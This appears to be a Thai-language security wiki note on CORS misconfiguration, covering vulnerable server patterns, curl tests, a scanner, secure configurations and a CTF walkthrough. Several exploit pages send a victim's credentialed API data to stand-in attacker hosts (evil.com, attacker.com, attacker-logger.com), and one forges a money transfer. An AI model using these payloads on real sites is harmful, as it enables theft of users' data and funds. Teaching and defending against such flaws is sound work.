# CORS Misconfiguration

## What
CORS (Cross-Origin Resource Sharing) Misconfiguration เป็นช่องโหว่ที่เกิดจากการตั้งค่า CORS policy ที่ไม่ปลอดภัย ทำให้เว็บไซต์อื่นสามารถอ่านข้อมูลที่มีความสำคัญจากเว็บเป้าหมายได้ ซึ่งตามปกติแล้ว Same-Origin Policy (SOP) จะป้องกันไม่ให้เว็บไซต์หนึ่งเข้าถึงข้อมูลจากอีก origin หนึ่ง

CORS เป็นกลไกที่ออกแบบมาเพื่อผ่อนปรน SOP อย่างปลอดภัย แต่หากตั้งค่าผิดพลาด ก็จะกลายเป็นช่องโหว่ที่ attacker สามารถใช้ขโมยข้อมูล เช่น API keys, personal data, authentication tokens ผ่าน malicious website ได้

## Landmark
- **CORS Headers**: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`
- **Vulnerable patterns**: Wildcard `*` with credentials, reflecting Origin header, null origin
- **API endpoints**: REST APIs, GraphQL endpoints, WebSocket connections
- **Response headers**: `Access-Control-Expose-Headers`, `Access-Control-Max-Age`
- **Preflight requests**: OPTIONS method, `Access-Control-Request-Method`
- **Credentials**: Cookies, Authorization headers, client certificates

> [!tip] Quick Detection
> ตรวจสอบ response header `Access-Control-Allow-Origin` ด้วย Burp Suite หรือ browser DevTools เมื่อส่ง request พร้อม Origin header

## CORS Basics

### Same-Origin Policy (SOP)
```javascript
// Same-Origin Policy example
// ตัวอย่าง Same-Origin Policy

// Origin: https://example.com
// เว็บนี้สามารถเข้าถึง:
✓ https://example.com/api/data
✓ https://example.com:443/api/data
✓ https://example.com/path/to/resource

// เว็บนี้ไม่สามารถเข้าถึง:
✗ http://example.com (different protocol)
✗ https://api.example.com (different subdomain)
✗ https://example.com:8080 (different port)
✗ https://evil.com (different domain)
```

### CORS Headers Explained
```http
# Request with Origin header
# Request ที่มี Origin header
GET /api/users HTTP/1.1
Host: api.example.com
Origin: https://trusted.com
Cookie: session=abc123

# Secure CORS response
# Response ที่มี CORS ที่ปลอดภัย
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Content-Type: application/json

{"users": [...]}
```

### Preflight Requests
```http
# OPTIONS preflight request
# Request ประเภท OPTIONS เพื่อตรวจสอบก่อนส่ง request จริง
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://trusted.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

# Preflight response
# Response สำหรับ preflight
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

## Types

### 1. Wildcard with Credentials
การใช้ wildcard (`*`) พร้อมกับ credentials - **ไม่ถูกต้อง**แต่บางครั้ง server อาจ reflect origin แทน

```javascript
// Vulnerable server configuration
// การตั้งค่า server ที่มีช่องโหว่
const express = require('express');
const app = express();

app.use((req, res, next) => {
    // อันตราย: รับทุก origin และอนุญาตให้ส่ง credentials
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Credentials', 'true');  // Invalid with *
    next();
});

app.get('/api/sensitive', (req, res) => {
    res.json({ secret: 'sensitive data' });
});
```

### 2. Origin Reflection
Server reflect ค่า Origin header โดยไม่ validate

```python
# Vulnerable Flask application
# แอปพลิเคชัน Flask ที่มีช่องโหว่
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

@app.route('/api/data')
def get_data():
    origin = request.headers.get('Origin')
    
    response = make_response(jsonify({'data': 'sensitive information'}))
    # อันตราย: reflect origin โดยไม่ตรวจสอบ
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    
    return response

# Exploitation:
# GET /api/data HTTP/1.1
# Origin: https://evil.com
# 
# Response จะมี: Access-Control-Allow-Origin: https://evil.com
```

### 3. Null Origin Bypass
การอนุญาต null origin ซึ่ง attacker สามารถสร้างได้

```python
# Vulnerable null origin handler
# การจัดการ null origin ที่มีช่องโหว่
@app.route('/api/data')
def get_data():
    origin = request.headers.get('Origin')
    
    # อันตราย: อนุญาต null origin
    if origin == 'null' or origin in TRUSTED_ORIGINS:
        response = make_response(jsonify({'secret': 'data'}))
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        return response
```

```html
<!-- Attacker can create null origin with sandbox iframe -->
<!-- Attacker สามารถสร้าง null origin ด้วย sandbox iframe -->
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://victim.com/api/data', {
    credentials: 'include'
}).then(r => r.json())
  .then(data => {
    // ส่งข้อมูลไปยัง attacker server
    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
  });
</script>"></iframe>
```

### 4. Subdomain Wildcard Bypass
การตรวจสอบ subdomain ที่อ่อนแอ

```javascript
// Vulnerable subdomain validation
// การตรวจสอบ subdomain ที่มีช่องโหว่
app.use((req, res, next) => {
    const origin = req.get('Origin');
    
    // อันตราย: ตรวจสอบแบบ string matching ที่อ่อนแอ
    if (origin && origin.endsWith('.example.com')) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

// Bypass:
// Origin: https://evil.com.example.com (attacker's domain)
// Origin: https://example.com.evil.com (ไม่ควร work แต่ check logic)
```

### 5. Pre-domain Wildcard
การใช้ regex หรือ pattern ที่ไม่ปลอดภัย

```php
<?php
// Vulnerable regex-based CORS check
// การตรวจสอบด้วย regex ที่มีช่องโหว่
$origin = $_SERVER['HTTP_ORIGIN'];

// อันตราย: regex ที่ match subdomain ใดๆ
if (preg_match('/^https?:\/\/[\w-]+\.example\.com$/', $origin)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
}

// Bypass attempts:
// https://evil-example.com (ถ้า regex ไม่ดี)
// https://attackerexample.com (ถ้าไม่มี boundary)
?>
```

## Exploitation

### Detection and Identification
```bash
# Step 1: Check for CORS headers
# ตรวจสอบ CORS headers
curl -H "Origin: https://evil.com" -I https://target.com/api/data

# Step 2: Test with custom origin
# ทดสอบด้วย origin ที่กำหนดเอง
curl -H "Origin: https://attacker.com" \
     -H "Cookie: session=abc123" \
     -v https://target.com/api/sensitive

# Step 3: Test null origin
# ทดสอบ null origin
curl -H "Origin: null" \
     -H "Cookie: session=abc123" \
     -v https://target.com/api/data

# Step 4: Check if credentials are allowed
# ตรวจสอบว่าอนุญาตให้ส่ง credentials หรือไม่
curl -H "Origin: https://evil.com" \
     -I https://target.com/api/data | grep -i "access-control-allow-credentials"
```

> [!warning] Critical Condition
> CORS misconfiguration จะเป็นช่องโหว่ที่ exploit ได้ **เฉพาะเมื่อ** `Access-Control-Allow-Credentials: true` ถ้าไม่มี flag นี้ browser จะไม่ส่ง cookies

### Basic Exploitation POC
```html
<!-- Basic CORS exploitation POC -->
<!-- POC การโจมตี CORS พื้นฐาน -->
<!DOCTYPE html>
<html>
<head>
    <title>CORS POC</title>
</head>
<body>
    <h1>CORS Exploitation POC</h1>
    <div id="result"></div>

    <script>
    // ฟังก์ชันสำหรับขโมยข้อมูลผ่าน CORS misconfiguration
    function exploitCORS() {
        const targetUrl = 'https://victim.com/api/sensitive';
        
        fetch(targetUrl, {
            method: 'GET',
            credentials: 'include',  // ส่ง cookies ของ victim
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            // แสดงข้อมูลที่ขโมยได้
            document.getElementById('result').innerHTML = 
                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            
            // ส่งข้อมูลไปยัง attacker server
            fetch('https://attacker.com/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        })
        .catch(error => {
            document.getElementById('result').innerHTML = 
                'Error: ' + error.message;
        });
    }

    // เรียกใช้ฟังก์ชันทันทีเมื่อหน้าเว็บโหลด
    window.onload = exploitCORS;
    </script>
</body>
</html>
```

### Advanced Exploitation with POST Request
```html
<!-- CORS exploitation with POST request -->
<!-- การโจมตี CORS ด้วย POST request -->
<!DOCTYPE html>
<html>
<body>
    <h1>Advanced CORS Attack</h1>
    <script>
    // โจมตีด้วย POST request เพื่อส่งข้อมูล
    function exploitPOST() {
        const targetUrl = 'https://victim.com/api/transfer';
        
        // ส่ง POST request พร้อม credentials
        fetch(targetUrl, {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                to: 'attacker_account',
                amount: 10000
            })
        })
        .then(response => response.json())
        .then(data => {
            // ส่งผลลัพธ์ไปยัง attacker
            navigator.sendBeacon('https://attacker.com/log', 
                JSON.stringify(data));
        });
    }

    window.onload = exploitPOST;
    </script>
</body>
</html>
```

### Automated CORS Scanner
```python
# CORS vulnerability scanner
# เครื่องมือสแกนหาช่องโหว่ CORS
import requests
from urllib.parse import urlparse

class CORSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerable = []
    
    def test_origin_reflection(self):
        """
        ทดสอบการ reflect origin header
        """
        test_origins = [
            'https://evil.com',
            'http://attacker.com',
            'https://malicious.org'
        ]
        
        print("[*] Testing Origin Reflection...")
        for origin in test_origins:
            headers = {'Origin': origin}
            
            try:
                response = requests.get(
                    self.target_url, 
                    headers=headers,
                    timeout=10
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin')
                acac = response.headers.get('Access-Control-Allow-Credentials')
                
                # ตรวจสอบว่ามีการ reflect origin และอนุญาต credentials
                if acao == origin and acac == 'true':
                    self.vulnerable.append({
                        'type': 'Origin Reflection',
                        'origin': origin,
                        'url': self.target_url
                    })
                    print(f"[+] VULNERABLE: {self.target_url}")
                    print(f"    Origin: {origin}")
                    print(f"    ACAO: {acao}")
                    print(f"    ACAC: {acac}\n")
                    
            except Exception as e:
                print(f"[-] Error testing {origin}: {str(e)}")
    
    def test_null_origin(self):
        """
        ทดสอบ null origin
        """
        print("[*] Testing Null Origin...")
        headers = {'Origin': 'null'}
        
        try:
            response = requests.get(
                self.target_url,
                headers=headers,
                timeout=10
            )
            
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            
            if acao == 'null' and acac == 'true':
                self.vulnerable.append({
                    'type': 'Null Origin',
                    'url': self.target_url
                })
                print(f"[+] VULNERABLE to Null Origin: {self.target_url}\n")
                
        except Exception as e:
            print(f"[-] Error testing null origin: {str(e)}")
    
    def test_subdomain_bypass(self):
        """
        ทดสอบการ bypass ผ่าน subdomain
        """
        print("[*] Testing Subdomain Bypass...")
        parsed = urlparse(self.target_url)
        domain = parsed.netloc
        
        test_origins = [
            f'https://evil.{domain}',
            f'https://{domain}.evil.com',
            f'https://attacker-{domain}'
        ]
        
        for origin in test_origins:
            headers = {'Origin': origin}
            
            try:
                response = requests.get(
                    self.target_url,
                    headers=headers,
                    timeout=10
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin')
                acac = response.headers.get('Access-Control-Allow-Credentials')
                
                if acao == origin and acac == 'true':
                    self.vulnerable.append({
                        'type': 'Subdomain Bypass',
                        'origin': origin,
                        'url': self.target_url
                    })
                    print(f"[+] VULNERABLE to Subdomain Bypass: {self.target_url}")
                    print(f"    Bypass Origin: {origin}\n")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)}")
    
    def scan(self):
        """
        เรียกใช้การ scan ทั้งหมด
        """
        print(f"\n[*] Scanning {self.target_url}\n")
        
        self.test_origin_reflection()
        self.test_null_origin()
        self.test_subdomain_bypass()
        
        print(f"\n[*] Scan Complete")
        print(f"[*] Found {len(self.vulnerable)} vulnerabilities\n")
        
        return self.vulnerable

# Example usage
if __name__ == '__main__':
    scanner = CORSScanner('https://api.target.com/data')
    results = scanner.scan()
    
    for vuln in results:
        print(f"Type: {vuln['type']}")
        print(f"URL: {vuln['url']}")
        if 'origin' in vuln:
            print(f"Origin: {vuln['origin']}")
        print()
```

> [!info] Testing Tools
> - [[Burp Suite]] - Manual CORS testing with Repeater
> - [[OWASP ZAP]] - Automated CORS scanning
> - Browser DevTools - Network tab for header inspection
> - Custom scripts - Bulk endpoint testing

## Prevention

### Secure CORS Implementation
```javascript
// Secure CORS configuration (Node.js/Express)
// การตั้งค่า CORS ที่ปลอดภัย
const express = require('express');
const cors = require('cors');

const app = express();

// Whitelist ของ trusted origins
const TRUSTED_ORIGINS = [
    'https://trusted-app.com',
    'https://partner-site.com',
    'https://mobile-app.com'
];

// Custom CORS middleware ที่ปลอดภัย
const secureCORS = (req, res, next) => {
    const origin = req.get('Origin');
    
    // ตรวจสอบว่า origin อยู่ใน whitelist หรือไม่
    if (origin && TRUSTED_ORIGINS.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Credentials', 'true');
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
        res.header('Access-Control-Max-Age', '3600');
    }
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
    }
    
    next();
};

app.use(secureCORS);

// Alternative: Using cors package with options
const corsOptions = {
    origin: function (origin, callback) {
        // อนุญาตให้ server-to-server requests (no origin)
        if (!origin) return callback(null, true);
        
        // ตรวจสอบว่า origin อยู่ใน whitelist
        if (TRUSTED_ORIGINS.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    optionsSuccessStatus: 204
};

app.use(cors(corsOptions));
```

### Python Flask Secure CORS
```python
# Secure CORS implementation in Flask
# การทำ CORS ที่ปลอดภัยใน Flask
from flask import Flask, request, jsonify, make_response
from functools import wraps

app = Flask(__name__)

# Whitelist ของ origins ที่ไว้ใจได้
TRUSTED_ORIGINS = [
    'https://trusted-app.com',
    'https://partner-site.com'
]

def secure_cors(f):
    """
    Decorator สำหรับ CORS ที่ปลอดภัย
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        origin = request.headers.get('Origin')
        
        # Handle preflight request
        if request.method == 'OPTIONS':
            response = make_response('', 204)
            
            if origin in TRUSTED_ORIGINS:
                response.headers['Access-Control-Allow-Origin'] = origin
                response.headers['Access-Control-Allow-Credentials'] = 'true'
                response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
                response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
                response.headers['Access-Control-Max-Age'] = '3600'
            
            return response
        
        # Handle actual request
        response = make_response(f(*args, **kwargs))
        
        # เพิ่ม CORS headers เฉพาะ trusted origins
        if origin in TRUSTED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
            response.headers['Access-Control-Allow-Credentials'] = 'true'
        
        return response
    
    return decorated_function

@app.route('/api/data')
@secure_cors
def get_data():
    return jsonify({'data': 'sensitive information'})
```

## Related Vulnerabilities
- [[CSRF]] - Cross-Site Request Forgery (CORS can bypass CSRF tokens)
- [[XSS]] - Cross-Site Scripting (can be used to bypass CORS)
- [[Session Hijacking]] - Stealing session via CORS
- [[API Security]] - API security best practices
- [[Same-Origin Policy]] - Understanding SOP

## CTF Example

### Challenge: "Share My API" (Medium)

**Scenario**: API endpoint ที่มี sensitive user data แต่มีการตั้งค่า CORS ที่ไม่ปลอดภัย

**Target**: `https://api.challenge.com/user/profile`

**Goal**: สร้าง POC เพื่อขโมย user profile data ผ่าน CORS misconfiguration

```javascript
// Challenge server code
// โค้ดของ challenge server
const express = require('express');
const app = express();

app.use((req, res, next) => {
    const origin = req.get('Origin');
    
    // Vulnerable: reflects any origin ending with .challenge.com
    // ช่องโหว่: reflect origin ใดก็ตามที่ลงท้ายด้วย .challenge.com
    if (origin && origin.endsWith('.challenge.com')) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

app.get('/user/profile', (req, res) => {
    // Check for valid session cookie
    if (req.cookies.session) {
        res.json({
            username: 'admin',
            email: 'admin@challenge.com',
            flag: 'FLAG{CORS_1s_d4ng3r0us_wh3n_m1sc0nf1gur3d}'
        });
    } else {
        res.status(401).json({error: 'Unauthorized'});
    }
});
```

**Solution Steps**:

```bash
# Step 1: Test CORS configuration
# ทดสอบการตั้งค่า CORS
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=victim_session" \
     -v https://api.challenge.com/user/profile

# Response: No ACAO header (blocked)

# Step 2: Test with .challenge.com suffix
# ทดสอบด้วย suffix .challenge.com
curl -H "Origin: https://attacker.challenge.com" \
     -H "Cookie: session=victim_session" \
     -v https://api.challenge.com/user/profile

# Response: ACAO: https://attacker.challenge.com (vulnerable!)

# Step 3: Register attacker.challenge.com domain
# ลงทะเบียน domain attacker.challenge.com

# Step 4: Create exploitation page
# สร้างหน้าเว็บสำหรับโจมตี
```

```html
<!-- Host this on attacker.challenge.com -->
<!-- โฮสต์หน้านี้บน attacker.challenge.com -->
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
</head>
<body>
    <h1>Congratulations! Click to claim your prize!</h1>
    
    <script>
    // ฟังก์ชันขโมยข้อมูล user profile
    function stealProfile() {
        fetch('https://api.challenge.com/user/profile', {
            method: 'GET',
            credentials: 'include'  // ส่ง session cookie ของ victim
        })
        .then(response => response.json())
        .then(data => {
            // ส่ง flag ไปยัง attacker server
            fetch('https://attacker-logger.com/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            console.log('Stolen data:', data);
            alert('Flag: ' + data.flag);
        })
        .catch(error => console.error('Error:', error));
    }

    // เรียกใช้อัตโนมัติเมื่อหน้าโหลด
    window.onload = stealProfile;
    </script>
</body>
</html>
```

**Flag**: `FLAG{CORS_1s_d4ng3r0us_wh3n_m1sc0nf1gur3d}`

> [!success] Key Learning
> การตรวจสอบ origin แบบ suffix matching (`.endsWith()`) เป็นช่องโหว่ที่พบบ่อย เพราะ attacker สามารถซื้อ subdomain หรือ domain ที่มี suffix ตรงกันได้

## References
- [[Web Security Testing]]
- [[Same-Origin Policy]]
- [[API Security]]
- [[Browser Security Model]]
- [[HTTP Headers Security]]

## Tools
- [[Burp Suite]] - Manual CORS testing
- [[OWASP ZAP]] - Automated scanning
- [[CORStest]] - Specialized CORS scanner
- Browser DevTools - Header inspection
- [[curl]] - Command-line testing

---
**Tags**: #web #cors #cross-origin #api-security #headers #sop #credential-theft
**Difficulty**: Medium
**Related**: [[CSRF]], [[XSS]], [[API Security]], [[Session Hijacking]]
